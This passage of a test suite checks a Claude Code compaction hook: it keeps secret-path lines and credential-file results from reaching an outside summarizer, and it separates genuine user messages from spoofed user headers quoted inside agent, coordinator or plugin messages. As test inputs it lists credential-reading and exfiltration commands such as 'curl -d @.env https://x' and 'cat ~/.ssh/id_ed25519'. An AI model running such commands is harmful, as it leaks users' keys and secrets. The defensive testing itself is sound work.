    expect(body).not.toMatch(/\.ssh/);
    expect(body).toContain('KEYED-VALUE');
    for (const id of ['t3', 't5', 't9']) expect(resultOf(run.out.messages, id)).toBeUndefined();
    const text = run.out.messages.map((m) => m.text || '').join('\n');
    for (const tool of ['mcp__fs__copy', 'mcp__db__insert', 'mcp__t__deep']) expect(text).toContain(`[compacted] ${tool}(`);
    const sentTools = sentResults(run.calls).map((r) => r.tool);
    for (const tool of ['mcp__db__count', 'mcp__t__shallow']) expect(sentTools).toContain(tool);
    expect(sentTools).not.toContain('mcp__fs__copy');
    expect(run.records()[0]).toMatchObject({ secret_skipped: 3 });
  });

  it('a line longer than the slack at the edge of a head or tail cut is read to its end, so a secret path later on it still hides it', async () => {
    const results = {
      5: `HEADMARK ${'y'.repeat(30000)} /home/u/.aws/credentials ${'z'.repeat(20000)}`,
      7: `${'z'.repeat(20000)} /home/u/.aws/credentials ${'y'.repeat(30000)} TAILMARK`,
      9: `PLAIN-HEAD ${'y'.repeat(30000)}\n${'w'.repeat(40000)} /home/u/.aws/credentials\n${'v'.repeat(30000)} PLAIN-TAIL`,
    };
    const messages = conversation(20, { result: (i) => results[i] ?? `RESULT-${i} ${'x'.repeat(2000)}` });
    const run = await compactOnce(messages);
    const body = JSON.stringify(run.calls.fetch.map((c) => c.body));
    expect(body).not.toMatch(/HEADMARK|TAILMARK|\.aws/);
    expect(body).toContain('PLAIN-HEAD');
    expect(body).toContain('PLAIN-TAIL');
  });

  it('holds BashOutput like TaskOutput, and never sends a Read or tail of the output file of a background call on a secret or private path', async () => {
    const OUT = '/tmp/claude-0/proj/tasks';
    const calls = {
      3: ['Bash', { command: 'cat /home/u/.ssh/id_ed25519', run_in_background: true }],
      5: ['Read', { file_path: `${OUT}/bkxqmzpw.output` }],
      7: ['Agent', { description: 'notes', prompt: 'summarize /home/u/secret-notes/today.md', run_in_background: true }],
      9: ['Bash', { command: `tail -n 20 ${OUT}/a31f77edb6dc2a0ac.output` }],
      11: ['BashOutput', { bash_id: 'bkxqmzpw' }],
      13: ['Bash', { command: 'npm test', run_in_background: true }],
      15: ['Read', { file_path: `${OUT}/bplainjob.output` }],
      16: ['Read', { file_path: '/home/u/proj/src/a.ts' }],
      17: ['Bash', { command: `cd ${OUT} && cat bkxqmzpw.output` }],
    };
    const results = {
      3: `Command running in background with ID: bkxqmzpw. Output is being written to: ${OUT}/bkxqmzpw.output. Working directory: /home/u/proj/ (see https://example.com/docs/x).`,
      5: `SECRET-READ ${'x'.repeat(2000)}`,
      7: `Async agent launched successfully.\nagentId: a31f77edb6dc2a0ac (internal ID - do not mention to user.)\noutput_file: ${OUT}/a31f77edb6dc2a0ac.output\nUse /tasks to watch live.`,
      9: `HELD-TAIL ${'x'.repeat(2000)}`,
      11: `HELD-BASHOUTPUT ${'x'.repeat(2000)}`,
      13: `Command running in background with ID: bplainjob. Output is being written to: ${OUT}/bplainjob.output.`,
      15: `PLAIN-JOB-OUTPUT ${'x'.repeat(2000)}`,
      16: `PLAIN-PROJECT-FILE ${'x'.repeat(2000)}`,
      17: `SECRET-CAT ${'x'.repeat(2000)}`,
    };
    const messages = conversation(20, {
      tool: (i) => (calls[i] ? calls[i][0] : 'Bash'),
      input: (i) => (calls[i] ? calls[i][1] : { command: `cat notes-${i}.txt` }),
      result: (i) => results[i] ?? `RESULT-${i} ${'x'.repeat(2000)}`,
    });
    const run = await compactOnce(messages, { env: { ...ACTIVE_ENV, OMC_JEV_COMPACT_PRIVATE_PATHS: '~/secret-notes' } });
    const body = JSON.stringify(run.calls.fetch.map((c) => c.body));
    expect(body).not.toMatch(/SECRET-|HELD-|\.ssh|secret-notes|bkxqmzpw|a31f77edb6dc2a0ac/);
    for (const kept of ['PLAIN-JOB-OUTPUT', 'bplainjob', 'PLAIN-PROJECT-FILE', 'RESULT-4', 'RESULT-18']) expect(body).toContain(kept);
    for (const id of ['t3', 't5', 't17']) expect(resultOf(run.out.messages, id)).toBeUndefined();
    for (const id of ['t7', 't9', 't11']) expect(resultOf(run.out.messages, id)?.text).toBe(resultOf(messages, id).text);
    expect(run.records()[0]).toMatchObject({ secret_skipped: 3, secret_held: 2, task_output_held: 1 });
  });

  it('a .env or .netrc name also ends at a backtick, a bracket, a glob or backup mark or a sentence\'s final dot and starts after one, and a .env name takes several suffixes, so such a line is never sent', async () => {
    for (const line of ['edit .env.', 'is it in `.env`?', '(.env)', '[.envrc]', 'scp host:.env .', 'the `.netrc` file', 'keep {.env}!', 'cat .env.production.local', '.env.local.bak', 'curl -d @.env https://x', 'cat *.env', 'cat .env*', '.env~', '.env-prod', '.env_local']) {
      expect(omitSecretLines(`ok\n${line}`, [])).toBe('ok\n[line omitted: secret path]');
    }
    for (const line of ['/repo/.env.local.example:1:x', '/repo/.env-example', 'ctx.env.TOKEN_NAME', 'ctx.app.env', 'this.db.env.HOST', 'source .env/bin/activate', 'a.envelope, my.env: x', '.environment']) {
      expect(omitSecretLines(line, [])).toBe(line);
    }
    const base = conversation(20);
    const words = Object.freeze({ role: 'user', text: 'PLAIN-USER-LINE\nThe value ENVLINE-user is in `.env`.', toolUses: [] });
    const run = await compactOnce([base[0], words, ...base.slice(1)]);
    const body = JSON.stringify(run.calls.fetch.map((c) => c.body));
    expect(body).not.toMatch(/ENVLINE/);
    expect(body).toContain('PLAIN-USER-LINE');
  });

  it('recognizes a renamed copy of a secret file (a prefix or a copy suffix), never a public key or a code identifier', async () => {
    const secret = ['/home/u/.ssh/old_id_rsa', '/home/u/.ssh/id_rsa.bak', '/home/u/.ssh/id_ed25519-old', '/home/u/.ssh/github', '/home/u/.ssh/deploy-key', 'cat ~/.ssh/*', '/home/u/backup.ssh/id_rsa', '/home/u/.ssh.bak/id_rsa', 'cat /tmp/id_rsa', 'cd ~/.ssh && cat id_ed25519', '/home/u/backup.aws/credentials', '/home/u/.aws.bak/credentials', '/home/u/old.netrc', 'C:\\Users\\u\\_netrc', '/repo/backup.env', '/repo/my-app.env', '/repo/x_1.env', '/repo/backup.env.bak', '/repo/prod.env:3:x'];
    for (const line of secret) expect(omitSecretLines(`ok\n${line}`, [])).toBe('ok\n[line omitted: secret path]');
    const plain = ['/home/u/.ssh/id_ed25519.pub', '/home/u/.ssh/old_id_rsa.pub', '/home/u/.ssh/deploy_key.pub', '/tmp/id_rsa.pub', '/home/u/.ssh/known_hosts', '/home/u/.ssh/known_hosts.old', '/home/u/.ssh/authorized_keys', '/home/u/.ssh/config', '/home/u/.ssh/config.d/work', '/etc/ssh/sshd_config', 'ctx.env', 'import.meta.env', 'this.env.TOKEN', '/repo/backup.env.example', '/repo/src/environment.ts', 'openssh-server', '/tmp/credentials'];
    for (const line of plain) expect(omitSecretLines(line, [])).toBe(line);
    const calls = { 3: ['Read', { file_path: '/repo/backup.env' }], 5: ['Read', { file_path: '/home/u/.ssh/old_id_rsa' }], 7: ['Read', { file_path: '/home/u/.ssh/id_ed25519.pub' }] };
    const messages = conversation(20, {
      tool: (i) => (calls[i] ? calls[i][0] : 'Bash'),
      input: (i) => (calls[i] ? calls[i][1] : { command: `cat notes-${i}.txt` }),
      result: (i) => (calls[i] ? `FILE-${i} ${'x'.repeat(2000)}` : `RESULT-${i} ${'x'.repeat(2000)}`),
    });
    const run = await compactOnce(messages);
    const body = JSON.stringify(run.calls.fetch.map((c) => c.body));
    expect(body).not.toMatch(/FILE-3|FILE-5|backup\.env|old_id_rsa/);
    expect(body).toContain('FILE-7');
    expect(run.records()[0]).toMatchObject({ secret_skipped: 2 });
  });

  it('with every eligible result on a private path and no limit set, nothing is sent and the results are pruned without the built-in summary', async () => {
    const messages = conversation(20, { tool: () => 'Read', input: () => ({ file_path: '/work/.env' }) });
    const run = await compactOnce(messages, { env: ACTIVE_ENV });
    expect(run.calls.fetch).toHaveLength(0);
    expect(run.next.seen).toHaveLength(0);
    expect(run.out).not.toBe(SUMMARY);
    expect(run.out.messages.length).toBeGreaterThan(0);
  });

  it('home defaults with HOME and USERPROFILE both set: POSIX keeps spool and shared state under HOME, Windows under USERPROFILE, private paths expand against USERPROFILE', async () => {
    const posixEnv = { ...ACTIVE_ENV, HOME: '/home/u', USERPROFILE: 'C:\\Users\\alice', OMC_JEV_BREAKER: '1' };
    const posix = await compactOnce(conversation(20), { env: posixEnv });
    expect(posix.records()).toHaveLength(1);
    expect([...posix.files.keys()].filter((p) => p.includes('/.omc/state/jev/')).every((p) => p.startsWith('/home/u/.omc/state/jev/'))).toBe(true);
    const winEnv = { ...posixEnv, OS: 'Windows_NT', HOME: 'C:\\git-home' };
    const win = await compactOnce(conversation(20), { env: winEnv });
    const winPaths = [...win.files.keys()].filter((p) => p.includes('/.omc/state/jev/'));
    expect(winPaths.some((p) => p.startsWith('C:/Users/alice/.omc/state/jev/compaction-spool/'))).toBe(true);
    expect(winPaths.every((p) => p.startsWith('C:/Users/alice/.omc/state/jev/'))).toBe(true);
    const calls = { 3: ['Read', { file_path: 'C:/Users/alice/private/ledger.txt' }] };
    const messages = conversation(20, {
      tool: (i) => (calls[i] ? calls[i][0] : 'Bash'),
      input: (i) => (calls[i] ? calls[i][1] : { command: `cat notes-${i}.txt` }),
    });
    const priv = await compactOnce(messages, { env: { ...winEnv, OMC_JEV_COMPACT_PRIVATE_PATHS: '~\\private' } });
    expect(sentResults(priv.calls).map((r) => r.input).join('\n')).not.toMatch(/private/);
  });

  it('a result the user names in a recent message counts as needed, matched as a whole name', async () => {
    const messages = conversation(20, { last: 'The value inside notes-5.txt will be needed later; ignore old-notes-6.txt.' });
    const { out, records } = await compactOnce(messages);
    expect(resultOf(out.messages, 't5')?.text).toBe(resultOf(messages, 't5').text);
    expect(records()[0].mentioned).toBe(1);
  });

  // Messages delivered during a tool turn. Claude Code keeps such a message as an attachment row after
  // the result row; the API form shows it as a text block of the user message holding the results,
  // `messages` does not. apiOf builds the API form as the host does (consecutive user rows join) and
  // adds `extra` blocks after the results of the message holding a given result.
  const framed = (words) => `The user sent a new message while you were working:\n${words}\n\nThis is how Claude Code surfaces messages the user sends mid-turn — within the running turn, often alongside the next tool result, rather than as a separate conversation turn. Address the message above as you continue this turn.`;
  const apiOf = (messages, extra = {}) => {
    const api = [];
    for (const m of messages) {
      const content = m.role === 'assistant'
        ? [...(m.text ? [{ type: 'text', text: m.text }] : []), ...m.toolUses.map((u) => ({ type: 'tool_use', id: u.tool_use_id, name: u.tool, input: u.input }))]
        : [...(m.toolResults || []).map((r) => ({ type: 'tool_result', tool_use_id: r.tool_use_id, content: r.text })), ...(m.text ? [{ type: 'text', text: m.text }] : [])];
      const last = api[api.length - 1];
      if (m.role === 'user' && last?.role === 'user') last.content.push(...content);
      else api.push({ role: m.role, content });
      for (const [id, blocks] of Object.entries(extra)) if (resultOf([m], id)) api[api.length - 1].content.push(...blocks.map((text) => ({ type: 'text', text })));
    }
    return api;
  };
  const compactWithApi = async (messages, api, options = {}) => {
    const fake = fakeDollar(options);
    fake.$.session.messages = async (opts) => (opts?.as === 'api' ? api : messages);
    const out = await load()['session.compact'](fake.$, Object.freeze({ trigger: 'auto', messages }), summaryNext());
    return { out, ...fake };
  };
  const step = (out, i) => out.findIndex((m) => m.role === 'assistant' && (m.text || '').split('\n').includes(`Step ${i}.`));
  const count = (out, text) => out.filter((m) => (m.text || '').includes(text)).length;
  // A block build carried into a rebuilt row: in its own envelope, the k-th of the row.
  const carried = (block, k = 1) => `<system-reminder id="jev-${k}">\n${block}\n</system-reminder id="jev-${k}">`;

  it('keeps a message the user typed during a tool turn word for word in its rebuilt row and counts it as theirs', async () => {
    const words = 'Turn 10: also run tail -2 notes-7.txt, then answer in one sentence.';
    for (const shown of [framed(words), `<system-reminder id="3ddbffe2">\n${framed(words)}\n</system-reminder id="3ddbffe2">`, `<system-reminder>\n${framed(words)}\n</system-reminder>`]) {
      const messages = conversation(30);
      const { out, calls, records } = await compactWithApi(messages, apiOf(messages, { t10: [shown] }));
      const at = out.messages.flatMap((m, k) => ((m.text || '').includes(shown) ? [k] : []));
      expect(at).toHaveLength(1);
      expect(out.messages[at[0]]).toMatchObject({ role: 'user' });
      expect(out.messages[at[0]].handle).toBeUndefined();
      expect(step(out.messages, 10)).toBeLessThan(at[0]);
      expect(at[0]).toBeLessThan(step(out.messages, 11));
      expect(pairingOk(messages, out.messages)).toBe(true);
      // The user's words count as theirs: in the task sent to Jev, and the file they name is kept.
      expect(calls.fetch[0].body.state.task).toEqual(['Task: review the notes and count the lines.', words, 'Good, now sum up the NEEDED results.']);
      expect(resultOf(out.messages, 't7')?.text).toBe(resultOf(messages, 't7').text);
      expect(records()[0]).toMatchObject({ result: 'jev', queued_user: 1, queued_other: 0, queued_carried: 1 });
      // At the next compaction the carried block (in its envelope, inside its own wrapper) still gives the user's words.
      const again = out.messages.map((m, k) => Object.freeze({ ...m, handle: `p${k}` }));
      const second = await compactWithApi(again, apiOf(again));
      expect(second.calls.fetch[0].body.state.task).toContain(words);
      expect(count(second.out.messages, shown)).toBe(1);
    }
  });

  it('a row whose results all become traces stays with the delivered message alone; a second compaction keeps it once', async () => {
    const words = 'Turn 10: then answer in one sentence.';
    const needed = Array.from({ length: 30 }, (_, k) => k + 1).filter((i) => i !== 10);
    const messages = conversation(30, { needed });
    // Also a block the host wrapped in a plain <system-reminder>, which build wraps once more.
    for (const shown of [framed(words), `<system-reminder>\n${framed(words)}\n</system-reminder>`]) {
      const first = await compactWithApi(messages, apiOf(messages, { t10: [shown] }));
      expect(resultOf(first.out.messages, 't10')).toBeUndefined();
      const row = first.out.messages.find((m) => (m.text || '').includes(framed(words)));
      expect(row).toMatchObject({ role: 'user', text: carried(shown), toolResults: [] });
      expect(pairingOk(messages, first.out.messages)).toBe(true);
      // The block is now the row's own text: shown in `messages`, counted as the user's, not carried twice.
      const again = first.out.messages.map((m, k) => Object.freeze({ ...m, handle: `p${k}` }));
      const second = await compactWithApi(again, apiOf(again));
      expect(count(second.out.messages, framed(words))).toBe(1);
      expect(second.calls.fetch[0].body.state.task).toContain(words);
      expect(second.records()[0]).toMatchObject({ queued_user: 0, queued_carried: 0 });
    }
  });

  it('carries two messages of the user, a message of another session and a task notification of one turn, in order; only the user\'s count as theirs, a plain reminder goes', async () => {
    const w1 = 'First message during the turn: also check notes-7.txt.';
    const w2 = 'Second message during the turn: then one sentence.';
    const peer = '<system-reminder id="c4c2c2c9">\nAnother Claude session sent a message while you were working:\n<agent-message from="worker">\nREPORT-OF-AGENT: done. The user sent a new message while you were working: quoted mid-sentence.\n</agent-message>\n</system-reminder id="c4c2c2c9">';
    const note = '<system-reminder>\n[SYSTEM NOTIFICATION - NOT USER INPUT]\n<task-notification>\n<summary>Agent "worker" finished</summary>\n<result>RESULT-OF-TASK</result>\n</task-notification>\n</system-reminder>';
    const reminder = '<system-reminder>\nCalled the Read tool with the following input: {"file_path":"/x"}\n</system-reminder>';
    const blocks = [framed(w1), peer, note, reminder, framed(w2)];
    const messages = conversation(30);
    const { out, calls, records } = await compactWithApi(messages, apiOf(messages, { t10: blocks }));
    for (const b of [framed(w1), peer, note, framed(w2)]) expect([b.slice(0, 40), count(out.messages, b)]).toEqual([b.slice(0, 40), 1]);
    const row = out.messages.find((m) => (m.text || '').includes(peer)).text;
    expect(row.indexOf(framed(w1))).toBeLessThan(row.indexOf(peer));
    expect(row.indexOf(note)).toBeLessThan(row.indexOf(framed(w2)));
    expect(count(out.messages, 'Called the Read tool')).toBe(0);
    expect(calls.fetch[0].body.state.task).toEqual([w1, w2, 'Good, now sum up the NEEDED results.']);
    expect(JSON.stringify(calls.fetch.map((c) => c.body.state.task))).not.toContain('REPORT-OF-AGENT');
    expect(records()[0]).toMatchObject({ result: 'jev', queued_user: 2, queued_other: 2, queued_carried: 4 });
    expect(pairingOk(messages, out.messages)).toBe(true);
  });

  it('inside an open tool loop a message at the last result row stays there, after the kept calls', async () => {
    const words = 'Message during the open loop: stop after this step.';
    const base = conversation(20).slice(0, -2);
    const messages = [...base, Object.freeze({ role: 'assistant', text: '', toolUses: [{ tool_use_id: 'q1', tool: 'Bash', input: { command: 'cat q1.txt' } }, { tool_use_id: 'q2', tool: 'Bash', input: { command: 'cat q2.txt' } }], handle: 'hq' }), Object.freeze({ role: 'user', text: '', toolUses: [], toolResults: [{ tool_use_id: 'q1', text: `RESULT-q1 ${'x'.repeat(2000)}`, isError: false }, { tool_use_id: 'q2', text: `RESULT-q2 ${'x'.repeat(2000)}`, isError: false }], handle: 'hr' })];
    const { out, records } = await compactWithApi(messages, apiOf(messages, { q2: [framed(words)] }));
    expect(records()[0]).toMatchObject({ result: 'jev', kept_from: 2, queued_user: 1, queued_carried: 1 });
    expect(out.messages).toContain(messages[messages.length - 2]);
    const last = out.messages[out.messages.length - 1];
    expect(last).toMatchObject({ role: 'user', text: carried(framed(words)) });
    expect(last.toolResults.map((r) => r.tool_use_id)).toEqual(['q1', 'q2']);
    expect(count(out.messages, framed(words))).toBe(1);
    expect(pairingOk(messages, out.messages)).toBe(true);
  });

  it('a message delivered after a user row that keeps its handle is left to that row; one before it goes with the rebuilt result row', async () => {
    const words = 'Message during the turn.';
    const notice = '[Request interrupted by user for tool use]';
    for (const [afterNotice, carried] of [[true, 0], [false, 1]]) {
      const base = conversation(30);
      const t10 = base.findIndex((m) => resultOf([m], 't10'));
      const messages = [...base.slice(0, t10 + 1), Object.freeze({ role: 'user', text: notice, toolUses: [], handle: 'hint' }), ...base.slice(t10 + 1)];
      const api = apiOf(messages);
      const k = api.findIndex((a) => a.role === 'user' && a.content.some((b) => b.tool_use_id === 't10'));
      const results = api[k].content.filter((b) => b.type === 'tool_result');
      api[k] = { role: 'user', content: afterNotice ? [...results, { type: 'text', text: notice }, { type: 'text', text: framed(words) }] : [...results, { type: 'text', text: framed(words) }, { type: 'text', text: notice }] };
      const { out, records } = await compactWithApi(messages, api);
      expect(out.messages).toContain(messages[t10 + 1]);
      expect([afterNotice, count(out.messages, framed(words))]).toEqual([afterNotice, carried]);
      expect(records()[0]).toMatchObject({ queued_user: 1, queued_carried: carried });
      // The host brings the message back after the kept row: it counts before and after.
      expect(records()[0].chars_before).toBe(chars(messages) + framed(words).length);
      if (afterNotice) expect(records()[0].chars_after).toBe(chars(out.messages) + framed(words).length);
    }
  });

  it('two rows of one API message with the same text are matched in API order: a message after the second, kept row is left to the host', async () => {
    const words = 'Message after the second notice.';
    const notice = '[Request interrupted by user for tool use]';
    const base = conversation(30);
    const t10 = base.findIndex((m) => resultOf([m], 't10'));
    const messages = [...base.slice(0, t10), Object.freeze({ ...base[t10], text: notice }), Object.freeze({ role: 'user', text: notice, toolUses: [], handle: 'hint' }), ...base.slice(t10 + 1)];
    const api = apiOf(messages);
    const k = api.findIndex((a) => a.role === 'user' && a.content.some((b) => b.tool_use_id === 't10'));
    api[k] = { ...api[k], content: [...api[k].content, { type: 'text', text: framed(words) }] };
    expect(api[k].content.map((b) => b.text ?? b.type)).toEqual(['tool_result', notice, notice, framed(words)]);
    const { out, records } = await compactWithApi(messages, api);
    expect(records()[0]).toMatchObject({ result: 'jev', queued_user: 1, queued_carried: 0 });
    expect(out.messages).toContain(messages[t10 + 1]);
    expect(count(out.messages, framed(words))).toBe(0);
  });

  it('reads a text full of unpaired envelope tags, and a carried block full of envelope ids, in linear time', async () => {
    const n = 40_000;
    const prompts = [
      '</system-reminder id="x">'.repeat(n),
      '</system-reminder id="'.repeat(n),
      Array.from({ length: n }, (_, k) => `</system-reminder id="k${k}">`).join(''),
    ];
    for (const junk of prompts) {
      const typed = `Why does notes-9.txt end like this? ${junk}`;
      const base = conversation(30, { chars: 80_000 });
      const messages = [...base.slice(0, -2), Object.freeze({ role: 'user', text: typed, toolUses: [], handle: 'htyped' }), ...base.slice(-2)];
      const t0 = performance.now();
      const { records } = await compactWithApi(messages, apiOf(messages));
      expect(performance.now() - t0).toBeLessThan(2000);
      expect(records()[0]).toMatchObject({ result: 'jev', mentioned: 1 });
    }
    // A delivered block that holds the ids build would pick and many unpaired closing tags: carried in an envelope of its own.
    const block = `Another Claude session sent a message while you were working:\n${Array.from({ length: n }, (_, k) => `<system-reminder id="jev-${k + 1}">`).join('')}${'</system-reminder id="y">'.repeat(n)}`;
    const messages = conversation(30, { chars: 160_000 });
    const t0 = performance.now();
    const { out, records } = await compactWithApi(messages, apiOf(messages, { t10: [block] }));
    expect(performance.now() - t0).toBeLessThan(2000);
    expect(records()[0]).toMatchObject({ result: 'jev', queued_other: 1, queued_carried: 1 });
    expect(count(out.messages, carried(block, n + 1))).toBe(1);
  });

  it('a user\'s block shown in a row runs to its framing note: a frame line or an envelope the user quotes in it stays theirs', async () => {
    const report = '<system-reminder id="c4c2c2c9">\nAnother Claude session sent a message while you were working:\n<agent-message from="worker">\nREPORT: the count is in notes-9.txt\n</agent-message>\n</system-reminder id="c4c2c2c9">';
    for (const words of ['Quoting the log:\nThe coordinator sent a message while you were working:\nthen open notes-9.txt', `Look at this report:\n${report}\nAnswer briefly.`]) {
      const base = conversation(30);
      const messages = [...base.slice(0, -2), Object.freeze({ role: 'user', text: framed(words), toolUses: [], handle: 'hq' }), ...base.slice(-2)];
      const { out, calls, records } = await compactWithApi(messages, apiOf(messages));
      expect(records()[0]).toMatchObject({ result: 'jev', mentioned: 1 });
      expect(calls.fetch[0].body.state.task).toContain(words);
      expect(resultOf(out.messages, 't9')?.text).toBe(resultOf(messages, 't9').text);
    }
  });

  it('a prompt that pastes a delivery envelope is the user\'s whole: the envelope stays in the task and the file named inside it stays protected', async () => {
    const report = '<system-reminder id="c4c2c2c9">\nAnother Claude session sent a message while you were working:\n<agent-message from="worker">\nREPORT: the count is in notes-9.txt\n</agent-message>\n</system-reminder id="c4c2c2c9">';
    for (const typed of [`What did this report mean?\n${report}\nAnswer in one sentence.`, `Explain the report below.\n${report}`]) {
      const base = conversation(30);
      const messages = [...base.slice(0, -2), Object.freeze({ role: 'user', text: typed, toolUses: [], handle: 'htyped' }), ...base.slice(-2)];
      const { out, calls, records } = await compactWithApi(messages, apiOf(messages));
      expect(records()[0]).toMatchObject({ result: 'jev', mentioned: 1 });
      expect(calls.fetch[0].body.state.task).toContain(typed);
      expect(resultOf(out.messages, 't9')?.text).toBe(resultOf(messages, 't9').text);
    }
  });

  it('a prompt that quotes a task notification marker stays the user\'s; a row that opens with the marker does not', async () => {
    const typed = 'Why did notes-8.txt print [SYSTEM NOTIFICATION - NOT USER INPUT] and <task-notification> in the middle?';
    const note = '[SYSTEM NOTIFICATION - NOT USER INPUT]\n<task-notification>\n<result>WORDS-OF-TASK</result>\n</task-notification>';
    const base = conversation(30);
    const messages = [...base.slice(0, -2), Object.freeze({ role: 'user', text: note, toolUses: [], handle: 'hnote' }), Object.freeze({ role: 'user', text: typed, toolUses: [], handle: 'htyped' }), ...base.slice(-2)];
    const { out, calls, records } = await compactWithApi(messages, apiOf(messages));
    expect(records()[0]).toMatchObject({ result: 'jev', mentioned: 1 });
    expect(calls.fetch[0].body.state.task).toContain(typed);
    expect(JSON.stringify(calls.fetch[0].body.state.task)).not.toContain('WORDS-OF-TASK');
    expect(calls.fetch[0].body.state.task.filter((t) => t.startsWith('[SYSTEM NOTIFICATION'))).toEqual([]);
    expect(resultOf(out.messages, 't8')?.text).toBe(resultOf(messages, 't8').text);
  });

  it('the same message delivered again after a row that already carries a copy is carried again, not hidden by the copy', async () => {
    const words = 'continue';
    const messages = conversation(30, { needed: [10] });
    const first = await compactWithApi(messages, apiOf(messages, { t10: [framed(words)] }));
    const again = first.out.messages.map((m, k) => Object.freeze({ ...m, handle: `p${k}` }));
    const row = again.find((m) => resultOf([m], 't10'));
    expect(row.text).toBe(carried(framed(words)));
    const second = await compactWithApi(again, apiOf(again, { t10: [framed(words)] }));
    expect(second.records()[0]).toMatchObject({ result: 'jev', queued_user: 1, queued_carried: 1 });
    const rebuilt = second.out.messages.find((m) => resultOf([m], 't10'));
    expect(rebuilt.handle).toBeUndefined();
    expect(rebuilt.text).toBe([carried(framed(words)), carried(framed(words), 2)].join('\n'));
  });

  it('with parallel results in rows of their own, a message belongs to the result row before it: after a row that keeps its handle the host brings it back, after a rebuilt one it is carried', async () => {
    const words = 'Message between the two results.';
    const base = conversation(20);
    const tail = [
      Object.freeze({ role: 'assistant', text: 'Two at once.', toolUses: [{ tool_use_id: 'img', tool: 'Screenshot', input: {} }, { tool_use_id: 'q', tool: 'Bash', input: { command: 'cat q.txt' } }], handle: 'hpar' }),
      Object.freeze({ role: 'user', text: '', toolUses: [], toolResults: [{ tool_use_id: 'img', text: '', result: [{ type: 'image' }] }], handle: 'himg' }),
      Object.freeze({ role: 'user', text: '', toolUses: [], toolResults: [{ tool_use_id: 'q', text: 'RESULT-q', isError: false }], handle: 'hq' }),
    ];
    const messages = [...base.slice(0, -2), ...tail, ...base.slice(-2)];
    const before = await compactWithApi(messages, apiOf(messages, { img: [framed(words)] }));
    expect(apiOf(messages, { img: [framed(words)] }).find((a) => a.content.some((b) => b.tool_use_id === 'img')).content.map((b) => b.type)).toEqual(['tool_result', 'text', 'tool_result', 'text']);
    expect(before.records()[0]).toMatchObject({ result: 'jev', kept_handle: 1, queued_user: 1, queued_carried: 0 });
    expect(before.out.messages).toContain(tail[1]);
    expect(count(before.out.messages, framed(words))).toBe(0);
    const after = await compactWithApi(messages, apiOf(messages, { q: [framed(words)] }));
    expect(after.records()[0]).toMatchObject({ result: 'jev', queued_user: 1, queued_carried: 1 });
    expect(after.out.messages.find((m) => (m.text || '').includes(framed(words))).toolResults.map((r) => r.tool_use_id)).toEqual(['q']);
  });

  it('a delivery equal to the text of an earlier row (a block a previous compaction carried) is still carried at its own result', async () => {
    const words = 'continue';
    const base = conversation(30);
    const t3 = base.findIndex((m) => resultOf([m], 't3'));
    const messages = [...base.slice(0, t3 + 1), Object.freeze({ role: 'user', text: framed(words), toolUses: [], handle: 'hcarried' }), ...base.slice(t3 + 1)];
    const { out, records } = await compactWithApi(messages, apiOf(messages, { t10: [framed(words)] }));
    const at = out.messages.flatMap((m, k) => ((m.text || '').includes(framed(words)) ? [k] : []));
    expect(at).toHaveLength(2);
    expect(step(out.messages, 10)).toBeLessThan(at[1]);
    expect(at[1]).toBeLessThan(step(out.messages, 11));
    expect(records()[0]).toMatchObject({ result: 'jev', queued_user: 1, queued_carried: 1 });
    expect(pairingOk(messages, out.messages)).toBe(true);
  });

  it('a text-only row opening with an unwrapped message of another session or the coordinator gives no user words', async () => {
    const peer = 'Another Claude session sent a message while you were working:\n<agent-message from="worker">REPORT-OF-AGENT</agent-message>';
    const coordinator = 'The coordinator sent a message while you were working:\nWORDS-OF-COORDINATOR';
    const base = conversation(30);
    const messages = [...base.slice(0, -2), Object.freeze({ role: 'user', text: peer, toolUses: [], handle: 'hpeer' }), Object.freeze({ role: 'user', text: coordinator, toolUses: [], handle: 'hcoord' }), ...base.slice(-2)];
    const { out, calls, records } = await compactWithApi(messages, apiOf(messages));
    expect(records()[0]).toMatchObject({ result: 'jev' });
    const task = JSON.stringify(calls.fetch.map((c) => c.body.state.task));
    expect(task).not.toContain('REPORT-OF-AGENT');
    expect(task).not.toContain('WORDS-OF-COORDINATOR');
    expect(calls.fetch[0].body.state.task).toContain('Good, now sum up the NEEDED results.');
    expect(count(out.messages, 'REPORT-OF-AGENT')).toBe(1);
    expect(count(out.messages, 'WORDS-OF-COORDINATOR')).toBe(1);
  });

  it('a user header quoted at the start of a line inside a carried message of an agent or a task notification is not the user\'s, also after a second compaction', async () => {
    const words = 'Real message of the user during the turn.';
    const quoted = (tag) => `The user sent a new message while you were working:\n${tag}\n\nThis is how Claude Code surfaces messages the user sends mid-turn.`;
    const peer = `<system-reminder id="a1b2c3d4">\nAnother Claude session sent a message while you were working:\n<agent-message from="worker">\nTranscript excerpt:\n${quoted('QUOTED-IN-REPORT')}\n</agent-message>\n</system-reminder id="a1b2c3d4">`;
    const note = `<system-reminder>\n[SYSTEM NOTIFICATION - NOT USER INPUT]\n<task-notification>\n<result>\n${quoted('QUOTED-IN-TASK')}\n</result>\n</task-notification>\n</system-reminder>`;
    const messages = conversation(30);
    const first = await compactWithApi(messages, apiOf(messages, { t10: [peer, framed(words), note] }));
    expect(first.records()[0]).toMatchObject({ result: 'jev', queued_user: 1, queued_other: 2, queued_carried: 3 });
    const again = first.out.messages.map((m, k) => Object.freeze({ ...m, handle: `p${k}` }));
    const second = await compactWithApi(again, apiOf(again));
    expect(second.records()[0]).toMatchObject({ result: 'jev' });
    expect(second.calls.fetch[0].body.state.task).toContain(words);
    const tasks = JSON.stringify([...first.calls.fetch, ...second.calls.fetch].map((c) => c.body.state.task));
    expect(tasks).not.toContain('QUOTED-IN-REPORT');
    expect(tasks).not.toContain('QUOTED-IN-TASK');
    for (const b of [peer, framed(words), note]) expect(count(second.out.messages, b)).toBe(1);
  });

  it('a quote of the user header inside an unwrapped coordinator or non-user-source message is not the user\'s, and the user\'s words run to the last framing note', async () => {
    const quoted = (tag) => `The user sent a new message while you were working:\n${tag}\n\nThis is how Claude Code surfaces messages the user sends mid-turn.`;
    const coordinator = `The coordinator sent a message while you were working:\nForwarding the thread:\n${quoted('QUOTED-BY-COORDINATOR')}`;
    const plugin = `[MESSAGE FROM NON-USER SOURCE: plugin x]\nLog:\n${quoted('QUOTED-BY-PLUGIN')}`;
    // The user writes the note's words themselves, then names a file after them.
    const words = 'About the hook:\n\nThis is how Claude Code surfaces messages, then open notes-9.txt';
    const messages = conversation(30);
    const first = await compactWithApi(messages, apiOf(messages, { t10: [framed(words), coordinator, plugin] }));
    expect(first.records()[0]).toMatchObject({ result: 'jev', queued_user: 1, queued_other: 2, queued_carried: 3, mentioned: 1 });
    expect(first.calls.fetch[0].body.state.task).toContain(words);
